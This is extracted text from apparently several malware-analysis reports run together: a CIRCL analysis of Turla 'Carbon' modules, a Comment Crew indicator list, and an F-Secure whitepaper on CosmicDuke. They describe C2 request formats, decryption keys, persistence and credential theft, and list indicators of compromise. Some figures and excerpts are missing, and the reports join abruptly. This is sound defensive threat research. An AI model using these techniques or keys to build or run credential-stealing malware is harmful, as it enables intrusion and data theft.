00002655 ModuleStart Scanned : 2009 - 12 - 27 12:15:01 - 40 scans - 24 detections ( 60.0 % ) Size : 228352 bytes Type : PE32 + executable ( DLL ) ( native ) x86 - 64 , for MS Windows Date : 0x4AC48FE7 [ Thu Oct 1 11:17:59 2009 UTC ] EP : 0x21454 .text
0/6 CRC : Claimed : 0x397f7 , Actual : 0x397f7 The strings correspond mostly to the ones of Sample B. Scanned : 2014 - 03 - 23 21:27:06 - 51 scans - 1 detections ( 1.0 % ) The strings correspond mostly to the ones of Sample C. Scanned : 2014 - 03 - 23 21:26:59 - 51 scans - 2 detections ( 3.0 % ) Size : 147968 bytes Type : PE32 + executable ( DLL ) ( GUI ) x86 - 64 , for MS Windows Date : 0x4AC5A685 [ Fri Oct 2 07:06:45 2009 UTC ] EP : 0x2001bd80 .text
0/6 CRC : Claimed : 0x0 , Actual : 0x32c9f [ SUSPICIOUS ] The strings correspond mostly to the ones of Sample D. A very extensive analysis of a similar kernel module of Sample B ( usbdev.sys ) has been documented in ' Uroburos : the snake rootkit ' 2 by deresz and tecamac .
Sample B also checks for the presence of infection markers in form of events : or as pseudo - code : That means , the famous Agent.btz marker \BaseNamedObjects\ { B93DFED5 - 9A3B-459b - A617 - 59FD9FAD693E } is checked directly using a UNICODE_STRING structure without using RtlInitUnicodeString ( ) .
A brief comparison with other samples , like or shows , that this marker is checked in the same way .
The analysis of this kernel module by deresz and tecamac is very detailed .
We advise the interested reader to work through their document to understand all the details .
In this module , the following transport or communication modules are present : Type 1 : tcp Type 2 : np , m2b - > TODO : Compare this with the observed transports in userland modules modules described in other reports This sample contains a large chunk of code taken from the Udis86 Disassembler Library for x86 / x86 - 64 project 6 The devices \Device\RawDisk1 \Device\RawDisk2 and the ﬁle \SystemRoot\ $ NtUninstallQ722833 $ \ﬁxdata.dat are already known from other reports .
If the ﬁle ﬁxdata.dat could successfully be created within the function also the devices are created within this function : The authors demonstrate that they have a sense of humor .
In the following example , they decrypt ( XOR ) the strings used to assemble the locations of where to drop the other components of the malware to .
The ﬁnal destinations are : \.\IdeDrive1\cryptoapi.dll \.\IdeDrive1\inetpub.dll But have a closer look at how they decrypt the string : They are seriously using a key 0x4E415341 to decrypt the string .
0x4E415341 is ASCII for ' NASA ' .
That 's how they decrypt and assemble the string IdeDrive , appending a ' 1 ' in the next step and using if for creating the destination .
Full excerpt below : \Registry\Machine\usblink_export HKEY_LOCAL_MACHINE\usblink_export ( also LEGACY_usblink and usblink ? ) The malware checks if the queried process has one of the following names and if so , it would call pulse_event_wininet_activate ( ) .
The event \BaseNamedObjects\wininet_activate is then created and pulsed .
There are no references to this event , neither in this module nor in the other analyzed modules .
Microsoft mentions in the documentation of the PulseEvent function 7 : Note This function is unreliable and should not be used .
It exists mainly for backward compatibility .
For more information , see Remarks .
So it could well be that this part is old code and was forgotten to be removed .
From Microsoft Support article AGP program may hang when using page size extension on Athlon processor 8 the following excerpt : The following workaround for this issue prevents Memory Manager from using the processor 's Page Size Extension feature and may aﬀect the performance of some programs , depending on the paging behavior .
This registry value also limits non - paged pool to a maximum of 128 megabytes ( MB ) instead of 256 MB .
Original ﬁlename : carbon_system.dll Internal name : Carbon v3.61 This component ﬁrst initializes the winsock subsystem by calling WSAStartup .
Right after it creates directories on the VFS : CreateDirectoryA ( `` \\\\.\\IdeDrive1\\\\Tasks\\ '' , ( LPSECURITY_ATTRIBUTES ) & Dst ) ; CreateDirectoryA ( `` \\\\.\\IdeDrive1\\\\Results\\ '' , ( LPSECURITY_ATTRIBUTES ) & Dst ) ; Sample D is the next ﬁle in the logical execution order , as it creates the following mutexes , which are also accessed by Sample E. Sample D can be considered the main userland module , a control unit that sets up the communication with the kernel module and has the ability to load plugins dynamically during runtime .
The internal name of this module , carbon_system.dll , supports this observation .
Global\\MSMMC.StartupEnvironment . PPT Global\\411A5195CD73A8a710E4BB16842FA42C Global\\881F0621AC59C4c035A5DC92158AB85E Global\\MSCTF.Shared . MUTEX.RPM Global\\WindowsShellHWDetection Global\\MSDBG.Global . MUTEX.ATF For reading or writing operations on ﬁles , exclusive access is ensured by locking them with mutexes : Global\MSMMC.StartupEnvironment . PPT is used for operations on the conﬁguration ﬁle .
Global\411A5195CD73A8a710E4BB16842FA42C is used to exclusively access temporary ﬁles Global\MSDBG.Global . MUTEX.ATF is used to exclusively access \.\IdeDrive1\log.txt Global\WindowsShellHWDetection is used to exclusively access \.\IdeDrive1\Results\result.txt Global\MSCTF.Shared . MUTEX.RPM is used to exclusively access \.\IdeDrive1\Tasks\task.txt Global\881F0621AC59C4c035A5DC92158AB85E is used to exclusively access \.\IdeDrive1\Tasks \task_system.txt During the startup of the ModuleStart ( ) function , 6 threads are being started .
The ﬁrst two are : get_initialization_parameters_create_GUID_and_check_Packet_Capturing ( ) periodic_free_space_check_and_write_log ( ) These serve the purpose of initializing the environment for the malware and running maintenance and log tasks .
Then a function load_transports ( ) is called ( more later ) , and then four more threads are started : read_conﬁg_start_thread_start ( ) thread 5 - handles frag.np/frag.tcp requests thread 6 - handles frag.np/frag.tcp requests execute_plugin ( ) - starts a new thread , calling a DLLs export ModuleStart from the \.\IdeDrive1\\Plugins\ directory In this module , the following transport or communication modules are present : Type 1 : tcp , b2 m Type 2 : np , frag , m2b each associated with a bunch of functions : TODO : these functions need to be analyzed and described Other reports mention diﬀerent other transports that are not present in this collection .
frag.np and frag.tcp replies : SEND AUTH RECV AUTH AUTH FAILED SEND WHO SEND OBJECT_ID frag.np/frag.tcp options : frag_size=32768 frag_no_scrambling=1 allow=*everyone active_con net_user= net_password= write_peer_nfo= % c % s % c nodelay = N \\.\IdeDrive1\ \\.\IdeDrive1\log.txt \\.\IdeDrive1\*.bak \\.\IdeDrive1\Tasks\\task.txt \\.\IdeDrive1\Tasks\\task_system.txt \\.\IdeDrive1\Tasks\\*.tmp \\.\IdeDrive1\config.txt \\.\IdeDrive1\restrans.txt \\.\IdeDrive1\Tasks\\ \\.\IdeDrive1\Results\\ \\.\IdeDrive1\logtrans.txt \\.\IdeDrive1\usbdev.bak \\.\IdeDrive1\inetpub.bak \\.\IdeDrive1\inetpub.dll \\.\IdeDrive1\cryptoapi.bak \\.\IdeDrive1\cryptoapi.dll \\.\IdeDrive1\Plugins\\ \\\\.\\Global\\PIPE\\comnode \\\\ % s\\pipe\\comnode \\\\ % s\\pipe\\ % s CUSTOM_ERROR_01 = 21590001h CUSTOM_ERROR_02 = 21590002h ; WAIT_TIMEOUT ? CUSTOM_ERROR_03 = 21590003h ; BROKEN_PIPE ? CUSTOM_ERROR_04 = 21590004h CUSTOM_ERROR_05 = 21590005h CUSTOM_ERROR_06 = 21590006h CUSTOM_ERROR_07 = 21590007h CUSTOM_ERROR_08 = 21590008h CUSTOM_ERROR_09 = 21590009h CUSTOM_ERROR_0A = 2159000Ah CUSTOM_ERROR_0B = 2159000Bh ; INVALID_USER_BUFFER ? CUSTOM_ERROR_0D = 2159000Dh CUSTOM_ERROR_64 = 21590064h CUSTOM_ERROR_65 = 21590065h CUSTOM_ERROR_66 = 21590066h CUSTOM_ERROR_67 = 21590067h CUSTOM_ERROR_68 = 21590068h CUSTOM_ERROR_69 = 21590069h CUSTOM_ERROR_C9 = 215900C9h ; NO_VALID_ADDR ? CUSTOM_ERROR_CA = 215900CAh ; NO_VALID_PORT ? CUSTOM_ERROR_CB = 215900CBh CUSTOM_ERROR_CC = 215900CCh Original ﬁlename : CARBON.dll Internal name : Carbon v3.51 \\.\IdeDrive1\config.txt \\.\IdeDrive1\Tasks\\task.txt \\.\IdeDrive1\Tasks\\task_system.txt \\.\IdeDrive1\log.txt \\.\IdeDrive1\Results\result.txt Global\\MSMMC.StartupEnvironment . PPT Global\\411A5195CD73A8a710E4BB16842FA42C Global\\881F0621AC59C4c035A5DC92158AB85E Global\\MSCTF.Shared . MUTEX.RPM Global\\WindowsShellHWDetection Global\\MSDBG.Global . MUTEX.ATF thread 2 : In a 10 minutes loop check server availability by doing a HTTP POST ( HTTP/1.0 ) to a server / port conﬁgured in \\.\IdeDrive1\config.txt in CW_INET section address with user agent Mozilla/4.0 ( compatible ; MSIE 6.0 ) but only if a valid internet connection was successfully probed : thread 3 : The actions described below are only taken if the following programs are not running tcpdump.exe windump.exe ethereal.exe wireshark.exe ettercap.exe snoop.exe The following is the main ( endless ) loop of this thread : It starts in do_HTTP_GET ( ) with a HTTP GET ( HTTP/1.1 ) to server / port taken from \\.\IdeDrive1\config.txt in CW_INET section address with user agent Mozilla/4.0 ( compatible ; MSIE 6.0 ) with script name and query as follows : auth.cgi ? mode = query & id= % u : % u : % u : % u & serv= % s & lang = en & q= % u- % u & date= % s where the format strings are ﬁlled in accordingly .
serv= is ﬁlled pseudorandomly with a host from the following list : www.yahoo.com www.bbc.com www.astalavista.com www.google.com www.eagames.com www.asus.com www.microsoft.com windowsupdate.microsoft.com search.microsoft.com www.hp.com www.altavista.com www.3com.com www.dell.com www.sun.com www.easports.com search.google.com perhaps to make a reasonable appearance or to mislead log analysts who ﬁlter out common domain names .
When a successful handle is returned , a ﬁle is being downloaded and stored in the virtual ﬁle system .
What follows is a GET in HTTP/1.0 on default.asp ? act= % u & id= % u & item= % u & event_id= % u & cln= % u & flt= % u & serv= % s & t= % ld & mode = query & lang = en & date= % s This code is part of sub_20009871 , which continues to serve the frag.np/frag.tcp part .
In sub_200075C0 another POST in HTTP/1.0 to default.asp ? act= % u & id= % u & item= % u & event_id= % u & cln= % u & flt= % u & serv= % s & t= % ld & mode = query & lang = en & date= % s follows .
The purpose of the two functions is not clear , yet .
In this module , the following transport or communication modules are present : Type 1 : tcp , b2 m Type 2 : np , frag , m2b This corresponds to the transports found in Sample D. The compiled code of bzip2/libbzip2 , a program and library for lossless block - sorting data compression , was identiﬁed , coming from http : //svn.apache.org / repos / asf / labs / axmake / trunk / src / libuc++/srclib / bzip2/compress.c .
Using the source code without including the author 's Copyright statement , the conditions and the disclaimer is an infringement of the software license : Sample C and D contain author names of three people : vlad gilg urik Newer samples , for instance the one from BAE , contain only two : vlad gilg First check - in : 2006 - 03 - 20 Last check - in : 2008 - 11 - 25 When incorporating the check - in dates of the BAE sample , the following graph shows that someone checked - in a ﬁle once during a Saturday .
A small collection of strings demonstrates the language deﬁcits , mainly distinguishable as : Use of backticks instead of apostrophes by some of the developers Problems using past tense by some developers Spelling Mistranslated terms Oversights Examples : win32 detect ...
x64 detect ...
CretaFileA ( % s ) : Ca n't open SERVICES key error has been suddenly occured timeout condition has been occured inside call of function OPER|Survive me , i ' m close to death ...
free space less than 5 % % ...
|\n OPER|Sniffer ' % s ' running ...
ooopppsss ...
|\n Task not execute .
Arg file failed .
Update failed = ( ( Ca n't create file .
ca n't get characs.\n Internal command not support = ( ( \n L|-1|ca n't get characs % s|\n CIRCL recommends to review the IOCs of this report and compare them with servers in the infrastructure of your organization which produce log ﬁles including proxies , A / V and system logs .
As this family of malware might be diﬀicult to detect from a network perspective , we recommend to perform check of the indicators at the system level .
TLP : WHITE information may be distributed without restriction , subject to copyright controls .
Version 0.9 July 10 , 2014 work - in - progress ( not a ﬁnal release ) ( TLP : WHITE ) 1 . http : //info.baesystemsdetica.com / rs / baesystems / images / snake_whitepaper.pdf ↩ 2 . http : //artemonsecurity.com / uroburos.pdf ↩ ↩2 3 . http : //blogs.avg.com / news - threats / turla - rootkit - analysed/ ↩ 4 . http : //www.symantec.com / security_response / writeup.jsp ? docid=2009 - 110919 - 1741 - 99 & tabid=2 ↩ 5 . http : //blog.threatexpert.com/2008/11/agentbtz - threat - that - hit - pentagon.html ↩ 6 . http : //udis86.sourceforge.net ↩ 7 . http : //msdn.microsoft.com / en - us / library / windows / desktop / ms684914 ( v = vs.85 ) .aspx
↩ 8 . http : //support.microsoft.com / kb / Q270715 ↩ Mission News RFC2350 Team Members Contact Services Dynamic Malware Analysis Platform Malware Information Sharing Platform Projects Software Publications Presentations BGP Ranking Common vulnerability exposure PGP key server Map of attacks against Luxembourg Free software CIRCL is the national CERT / CSIRT ( Computer Emergency Response Team / Computer Security Incident Response Team ) for Luxembourg .
Content from this website is classiﬁed as TLP : WHITE information may be distributed without restriction , subject to copyright controls .
Copyright 2008 - 2014 CIRCL Computer Incident Response Center Luxembourg ( smile gie ) , national CERT .
This document contains additional Comment Crew indicators of compromise that were seen in the past year .
See our accompanying blog for more information .
This document details the following types of indictors : - Network - File - System - Email The contents of this document are indicators only and may match legitimate services or applications .
Additional verification is required to confirm an actual compromise .
Network based indications of possible compromise by the comment crew attackers .
File based indications of possible compromise by the comment crew attackers .
- % TEMP % \AdobeARM.exe - % TEMP % \iTunesHelper.exe - % PROGRAMS % \Startup\AdobeRe.exe - rouj.exe - % USERPROFILE % \Local Settings\iexplore.exe - % USERAPPDATA % \Microsoft\wuauclt.exe - % PROGRAMS % \Startup\adobeup.exe - % TEMP % \AdobeUpdater.exe - NTLMSVC.DLL - % PROGRAMS % \Startup\adobe_sl.lnk - % TEMP % \runinfo.exe Product : SoundMAX service agent Description : Microsoft NTLM Service Holder Product & Description : JpgAsp System based indications of possible compromise by the comment crew attackers .
Email based indications of possible compromise by the comment crew attackers .
TLP : WHITE In this document we report on our analysis of CosmicDuke - the first malware seen to include code from both the notorious MiniDuke APT trojan and another longstanding threat , the information- stealing Cosmu family .
When active on an infected machine , CosmicDuke will search for and harvest login details from a range of programs and forward the data to remote servers , some of which were active at the time of writing .
F - SECURE LABS SECURITY RESPONSE Malware Analysis Whitepaper In early 2013 , the MiniDuke malware was discovered in use in a series of attacks against NATO and European government agencies .
While investigating MiniDuke loaders in April 2014 , we were surprised to notice that the malicious executable being decompressed and loaded into memory was very similar to the Cosmu family of information - stealers , which we saw as long ago as 2001 .
Cosmu is the first malware family we have seen to share code with MiniDuke .
This analysis is focused on those Cosmu samples that share code with MiniDuke .
Some of these are older than the oldest publicly documented MiniDuke samples , implying that the shared code might have been originally used by Cosmu , not MiniDuke .
For convenience , we decided to name the samples showing this amalgamation of MiniDuke - derived loader and Cosmu - derived payload CosmicDuke .
The filenames and content used in CosmicDuke 's attack files to lure victims into opening them contain references to the countries of Ukraine , Poland , Turkey and Russia , either generally in use of language or included detail , or in allusions to events or institutions .
The filenames and content chosen seem to be tailored to their target 's interests , though at the time of writing , we have no further information on the identity or location of these victims .
CosmicDuke infections start by tricking victims into opening either a PDF file that contains an exploit or a Windows executable whose filename is manipulated to make it look like a document or image file .
Once the victim opens the file , the malware gains persistence on the system and starts collecting information .
The data collection components include a keylogger , clipboard stealer , screenshotter , and password stealers for a variety of popular chat , email and web browsing programs .
It also collects information about the files on the system , and has the capability to export cryptographic certificates and the associated private keys .
Once the information has been collected , it is sent out to remote servers via FTP .
In addition to stealing information from the system , Cosmu allows the attacker to download and execute other malware on the system .
F - Secure has detections for all the different malicious components used by the Cosmu variants described in this report .
We have seen dozens of Cosmu samples that share code with MiniDuke .
Rather than cover the entire spectrum of samples , the scope of this analysis was intentionally limited to highlighting the most interesting of the recent samples .
This includes examining the attack files used to infect targets , the remote servers storing data collected from the victims and the differences between the MiniDuke loaders and Cosmu info - stealers used in the samples .
This analysis is based on examination of files we gathered through our sample collection systems .
Based on the nature of the filenames and decoy documents used , and the fact that the MiniDuke loader is known to be used as a part of targeted attacks , we suspect that CosmicDuke may also be used in such operations .
At the time of writing , we have not identified any victims ourselves , nor are we aware of any public reports confirming this scenario .
At this time , we have no information on how the CosmicDuke attack files are delivered to the victims , though based on the findings from the analysis , we can make an educated guess .
It is possible that the PDF documents containing exploits were emailed to the targeted users as file attachments .
Assuming that the email gateway used by the victims does not include an antivirus solution capable of identifying the exploit , such files would have little impediment to being spread by email .
It is however unlikely that the samples which camouflaged the executable files as image or document files would be distributed in the same way .
Regardless of any tricks played with the filenames , the files themselves are Windows executables , and many email solutions today prevent users from opening attached executable files .
The attackers are using at least two different methods for infecting the systems : exploits and social engineering .
CosmicDuke malware samples that use exploits to gain entry onto a target system ( referred to as exploit files in the rest of this document ) start with a malicious Flash object embedded into a PDF file .
When the file is launched , the object exploits the known CVE-2011 - 0611 vulnerability in specific versions of Adobe Flash , Reader and Acrobat products .
Unlike the CosmicDuke files geared towards social engineering , the exploit files do not actually display any documents to the user as a form of distraction ; the malware simply straightaway exploits the vulnerability .
Less technically challenging CosmicDuke samples use simple social engineering to trick the user into willingly launching the attack file .
Once launched , the file drops the malware onto the system ( such files are therefore referred to as droppers in the rest of this documents ) .
To do so , the malware 's executable file is first disguised as an image or document to make it seem innocuous .
When launched , a document or image is displayed in order to draw the user 's attention away from any background activity .
In the meantime , the malware 's malicious files are silently installed and executed on the system .
CosmicDuke 's primary purpose is to steal information .
The different ways it collects information from the infected machine are as follows : yy Keylogger yy Taking screenshots yy Stealing data from clipboard yy Stealing files yy Stealing PKI certificates and associated private keys yy Stealing usernames and passwords from browsers , instant messengers and email clients yy Stealing WLAN passwords yy Stealing Windows password hashes The information collected by the malware is automatically uploaded to remote servers via FTP .
Our analysis also reveals various details of the remote sites contacted by CosmicDuke , including the login credentials used and the FTP folder structure .
At the time of writing , most of these remote sites are live .
A list of the servers CosmicDuke malware connects to is on page 15 .
CosmicDuke samples can be divided into 3 distinct groups based on similarities between the C & C servers they contact , file characteristics and decoy document used .
The full details of how the samples were grouped is listed on page 11 ; Figure 2 at left provides a quick summary of the grouping as they relate to how CosmicDuke is delivered , and the decoy documents shown .
The first group of samples ( Group # 1 ) is spread using 3 dropper files that display specific decoy documents .
The second sample group ( Group # 2 ) uses both exploit - loaded files and dropper files .
The third group ( Group # 3 ) is rather an exception , as it does not use the droppers or exploits listed here ; for the sake of simplicity , we will exclude considering Group # 3 's delivery method .
CosmicDuke 's author ( s ) disguised the fact that the malware is an executable file by using the Right - to - Left Override ( RLO ) feature in Windows to hide the file 's correct file extension , .exe
or .scr
, and replace it with .jpg
, .pdf
or .doc
, in order to make the file appear to be an innocuous document or image .
Image 1 is a screenshot of how the filenames look like in Windows 7 .
The real file extension for the top four files is .scr
, while the real extension for the bottom one is .exe
.
Note that the attacker has also carefully changed the icon of the executable to reflect the fake filetype for the first four .
The bottom file is a curious exception , as it does not use a PDF icon as would be expected with a .pdf
file extension ; instead , it uses an NVIDIA icon , most likely to reflect the fact that the product name of the executable is listed as `` NVIDIA Update Components '' in the file 's version information .
This seems to be a common fake product name used in the latest Cosmu samples .
Meanwhile , the filename readily visible to the users is translated from Turkish as `` civilian crisis center status report '' .
The use of RLO is a smart move from the attackers .
Why go through the trouble of exploiting anything if you can simply trick the user into double - clicking an executable that looks a lot like a document file ? As the screenshot demonstrates , unchecking `` Hide extensions for known filetypes '' does not help .
The three- letter file extensions seen at the end of the filename is not the real file extension .
Even though the information in the Type column is correct , most of the users probably do not even check it .
DROPPER : DECOYS CosmicDuke dropper files all display some kind of a decoy document or image to distract the user when the attack file is launched .
The following are the droppers used by Group # 1 .
Here are the filenames of the decoys , as displayed in Windows , and the decoy images or files they show when launched : yy rcs.Заказ.doc - Image 2 yy rcs.18.jpg - Image 3 yy rcs . DSC_1365527283.jpg - Image 4 The decoys are interesting .
Заказ means `` order '' in Russian .
Based on the characters СЖС-1295 and ГХРП found in the decoy , the document looks like an order for growth hormones .
The document contains full delivery address , including the name of the person placing the order .
An interesting detail about the image file of a receipt ( Image 3 ) shown by rcs.18.jpg is that it contains EXIF metadata , including the date when the photo was taken and the model of the mobile phone that was used to take the photo .
Part of this EXIF metadata is shown in Image 3a .
The third dropper file we ' ve seen uses the filename ' rcs .
Ukraine - Gas - Pipelines - Security - Report - March-2014.pdf ' , and displays the decoy document shown in Image 6 .
This particular dropper file is notable in that its info - stealer ( SHA1 : f513b21738ae3083d79e4fa1039889e1c3efff58 ) is the same one used by the exploit file named `` Bulletin - PISM- No-31- ( 625 ) -March-10 - 2014.pdf '' .
The code used by CosmicDuke to exploit the CVE-2011- 0611 vulnerability appears to be derived from this proof- of - concept code that was made available in early 2011 : yy http : //www.exploit - db.com / exploits/17473/ The samples we analyzed of the exploit - based CosmicDuke variety had the file names and SHA1 values listed in Figure 3 at right ( see `` Appendix A | Samples '' for more details ) .
Some of these exploit files have interesting filenames , such as `` dip.mail march.pdf '' and `` Bulletin - PISM - No- 31- ( 625 ) -March-10 - 2014.pdf '' .
The PISM mentioned in the latter presumably refers to the Polish Institute of International Affairs .
The CosmicDuke samples we analyzed used the same loader as MiniDuke 's stage 3 samples , making this the first occasion in which we ' ve seen other malware using this particular loader .
The parallel usage of the loader in the CosmicDuke and MiniDuke families is interesting .
The oldest samples we have of this loader that loads Cosmu malware show the compilation date of the loader as March 24 2011 , which predates the oldest publicly documented MiniDuke sample ( with a recorded loader compilation date of June 18 2012 ) .
The earlier use of the loader with a Cosmu payload leads us to suspect the existence of a link between the author ( s ) of Cosmu and MiniDuke .
The most common compilation date seen for the loaders that load the Cosmu malware is November 13 2012 .
Perhaps coincidentally , we found one MiniDuke sample ( originally reported by CrySys ) that also shows the same compilation date .
In this case however , the MiniDuke component is actually a downloader ; it connects to an IP address in Turkey , and when it receives a response , decrypts and executes it .
Also of interest is that once the MiniDuke loader was updated , we saw CosmicDuke samples take the updated loader into use in mid - April 1 2014 , a few months after MiniDuke started using the latest loader in mid - December 2013 .
It seems possible that the actors behind the two malware families share code and/or tools .
The Cosmu info - stealer is the main component of the CosmicDuke malware .
The technical description of the info - stealer is based on analysis of the following sample : SHA1 : b072577447cdf3936d95e612057e510dd3435963 .
Cosmu has a couple of different mechanisms for achieving persistence on the system .
It creates a scheduled task and installs a Windows service .
The scheduled task is typically named `` Watchmon Service '' .
It executes the malware at system startup .
The service typically has name javamtsup , and the display name is `` Java ( TM ) Virtual Machine Support Service '' .
The size of the service binary on disk varies , but typically the real size is 5120 bytes ( based on PE headers ) and the SHA1 value is 7803f160af428bcfb4b9ea2aba07886f232cde4e .
The service itself is very straightforward : it opens a handle to explorer.exe process , duplicates its process token , reads the path of the actual malware binary from registry ( key HKLM\Software\JavaSoft , value Supplement ) and starts the malware using the duplicated process token .
Cosmu copies itself with a couple of different filenames to % WINDIR % \system32 .
The binaries on the disk have a variable length of zero - padding but they are all essentially copies of the original malware binary .
The filenames for both the Cosmu copies and the service binary are generated by randomly taking two items from the following list and concatenating them , resulting in filenames like usbmon.exe , urllsa.exe , and rasdns.exe : The malware targets the following software : yy Instant messaging  Skype The malware steals Skype login MD5 .
The attacker can obtain victim 's Skype username and password by using a bruteforce or dictionary attack to crack the MD5 .
The attack was publicly documented in 2006 .
 Google Talk Cosmu decrypts and steals saved credentials from Google Talk .
 MSN Messenger Cosmu decrypts and steals saved credentials from MSN Messenger .
yy Browsers  Google Chrome Cosmu steals saved credentials from Google Chrome .
 Internet Explorer Cosmu steals autocomplete passwords from IE .
It also collects information about visited websites , i.e. , browsing history .
 Firefox Cosmu steals saved credentials and the associated URLs from Firefox .
The malware does not decrypt the credentials .
yy Email clients  Thunderbird Cosmu steals saved credentials and the associated mail server hostnames from Thunderbird .
The malware does not decrypt the credentials .
 Bat email client Cosmu steals credentials from Bat email client by parsing account.cfn and decrypting the credentials .
 Outlook Express Cosmu steals saved credentials and information about the associated mail server from Outlook Express .
 Outlook Cosmu steals saved credentials and information about the associated mail server from Outlook .
 Google Desktop Cosmu decrypts and steals saved credentials from Google Desktop .
yy Others  Windows credentials LM and NT hashes , cached domain passwords , LSA secrets .
 WLAN Cosmu uses WlanGetProfile to retrieve plain text keys for WLANs .
Cosmu exports certificates and , if available , the associated private keys from system store by calling PFXExportCertStoreEx .
The malware uses the password '' saribas '' to encrypt the exported data .
Cosmu searches the hard drives and network drives for files that match any of the below patterns : Patterns * sifr * and * sifer * are interesting because they clearly target non - English filenames , given that ' sifr ' is the Arabic word for zero ( and interestingly enough , also the base word for an encryption cipher in many languages ) .
Cosmu searches removable drives for a broader set of files – only files whose filename matches any of the following patterns are skipped / ignored : An interesting detail is that Cosmu skips searching the removable drive if the volume name is `` trandescend '' ( case insensitive comparison ) .
The keylogger is implemented using the GetKeyboardState API .
Key logging is skipped if one of the following AV process is running on the system : Cosmu takes screenshots periodically and sends them to the attacker , together with other stolen data .
Cosmu copies the content of the clipboard every 30 seconds and sends those to the attacker together with other stolen data .
The configuration can contain the following information : yy HTTP server IPs and URL paths yy FTP server IPs , usernames and passwords yy WebDav IPs , usernames and passwords yy Filename prefix and file extension for downloaded files yy Filename prefix and file extension for exfiltrated data In all the configurations we have seen , the servers are specified using IP addresses , not domain names .
The configuration is embedded into the info - stealer .
It is compressed using an algorithm similar to but simpler than LZNT-1 .
The sample makes HTTP GET requests to the server ( s ) specified in the configuration .
The GET request contains the following fields in this order : The first field , m or mgn , does not have any value .
The value of Auth is the ID of the sample .
It is the same 8-character hex digit that can be found in the PDB path , among other places .
The value of Query depends on the request .
It is either encoded using URL safe base64 , or then the value is a 1792-character string .
That string is composed of a 256-character string that is repeated seven times .
The 256-character string is generated by selecting characters randomly from the following 32-character alphabet : abcdefghijklmnopqrstuvwxyz012345 The malware uses the FTP servers and WebDav servers both for exfiltrating the collected data and for updating the malware .
All servers used by the info - stealers listed in `` Appendix A | Samples '' are listed in `` Appendix B | Servers '' .
Cosmu uses RC4 to decrypt incoming data and encrypt outgoing data .
The RC4 routine is not standard RC4 , but instead of an intentional customization it seems that the implementation is simply buggy .
The mistake is illustrated in Figure 5 that shows a Python re - implementation of the buggy RC4 .
All RC4 keys are 32 bytes .
Here are the known keys : yy pHG5AS4deKLil9ADdR2BcA1hTNm0FQz3 yy 3Pf4GxTaDnx50qWe2Xz62uSptFsR3g3P yy AdjustKernelTableFromSSDTSpace2\x00 yy FB7V61C7509E4L99BDZ7F74A79A69CDF Even though only the first 32 bytes are used as the RC4 key , the first two RC4 keys in the above list are followed by an interesting string : Atruefriendissomeonewhothinksthatyouareagoodegg eventhoughheknowsthatyouareslightlycrackedgroove '' A true friend is someone who thinks that you are a good egg even though he knows that you are slightly cracked '' is a Bernard Meltzer quote .
A comparison of the compilation times of the samples , and of other similarities observed in the file characteristics , reveals some interesting patterns .
For more details , see `` Appendix A | Samples '' .
The oldest Cosmu samples we saw have a compilation timestamp of 2001 - 09 - 25 .
Since it is possible for the compilation timestamp to be manipulated , it may be that the samples are not that old .
We have however not seen any samples that would give us reason to suspect that the timestamp has been tampered with .
These old samples do not use the MiniDuke loader and therefore are not discussed in detail in this analysis .
They do however show some characteristics that link them to these fresh variants .
For example , the credentials and same FTP folder structure used by the old samples have been used on another Cosmu FTP server that is still active .
All droppers were compiled on 2013 - 08 - 02 .
The majority of the loaders were compiled on 2012 - 11- 13 , though one was compiled on 2012 - 12 - 04 - oddly enough , the same day when one MiniDuke payload reported by BitDefender and Kaspersky , ( md5 : 6bc34809e44c40b61dd29e0a387ee682 ) was compiled .
This was a downloader that connects to an IP address in Turkey .
As the server is no longer up however , we were unable to investigate it further .
The compilation timestamps of the info - stealers show more variation .
The oldest variant loaded with the MiniDuke loader was compiled on 2012 - 12 - 04 .
Most of the info - stealers were compiled in February and March 2014 .
The info - stealer samples we have analyzed can be also be separated into three distinct groupings based on the following attributes : yy The program database ( PDB ) path yy Server address and credentials yy The loader yy Filenames and decoy content Full list of the servers contacted by samples in these groupings in available in Appendix B | Servers on page 15 .
All samples in this group have a PDB path on the infected system 's C : \ drive that contains the directory '' botgenstudio '' .
yy c : \botgenstudio\generations\8f1777b0\bin\Bot.pdb yy c : \botgenstudio\generations\fed14e50\bin\Bot.pdb yy c : \botgenstudio\generations\55ff7700\bin\Bot.pdb All samples in this group use the same RC4 key : `` FB7V61C7509E4L99BDZ7F74A79A69CDF '' The servers used by this group are exclusive to this group , i.e. , the other sample groups do not use any of the servers group # 1 uses .
The IP address of the servers used by this group of samples are in Luxembourg , Netherlands , and Russia .
See `` Appendix B | Servers '' for details .
We have seen three different droppers for this sample group .
All droppers use the RLO trick .
We have not found any exploits associated to this group of samples .
All samples in this group have a PDB path that contains directories named `` NITRO '' and `` SVA '' .
The PDB path is always on D : \ drive .
Here are some examples : yy D : \production\nitro\sva\generations\809113dd\bin\ Bot.pdb yy D : \SVA\NITRO\PRODUCTION\Generations\805B1D01\ bin\bot.pdb yy D : \PRODUCTION\NITRO\SVA\Generations\8052B6C0\ bin\Bot.pdb yy D : \PRODUCTION\NITRO\SVA\Generations\80B8A0BA\ bin\bot.pdb All samples except one in this group use PDF files with exploits as an infection vector .
The sole exception is sha1:98f81b03a3b0f7b0b914d783683817953e8d4cf0 .
It does not use an exploit and it does not use a dropper ; instead the loader has a filename ( Sivil Durum Raporu Kriz Merk ? fdp.izay.exe ) that uses the same RLO trick used in Group # 1 samples .
Another interesting detail for this sample is the PDB path : d : \sva\nitro\botgenstudio\interface\ generations\80ddfcc1\bin\Bot.pdb Even though this contains both `` SVA '' and `` NITRO '' , it also contains `` botgenstudio '' , again making it similar to Group # 1 .
One other sample in Group # 2 ( sha1 : fb3b8f6494b211386381a7e4f6524d3e4643c9e9 ) shows a similar PDB path .
The servers used by this group are exclusive to this group , i.e. , the other sample groups do not use any of the servers group # 2 uses .
The most recent CosmicDuke samples all belong to this group .
Unlike Groups # 1 and # 2 , no exploits or droppers are known to be associated with Group # 3 samples , and the loader filenames do not use the RLO trick .
As such , we will not cover Group # 3 's delivery method further .
Of more interest with Group # 3 is that older samples within this groupin show some differences from the latest variants .
A few older samples in Group # 3 still use the original MiniDuke loader , while most recent ones are using the updated MiniDuke loader .
Another difference is that unlike the older ones , the latest samples use the following PDB path : yy D : \PRODUCTION\NITRO\KSK\Generations\70BCDEA1\ bin\Bot.pdb .
This is quite similar to Group # 2 , though it seems `` SVA '' has been replaced by `` KSK '' .
All samples in Group # 3 connect to an FTP server at IP 188.116.32.164 using the same username ( `` adair '' ) and password .
This is the only server that the samples with the original MiniDuke loader use .
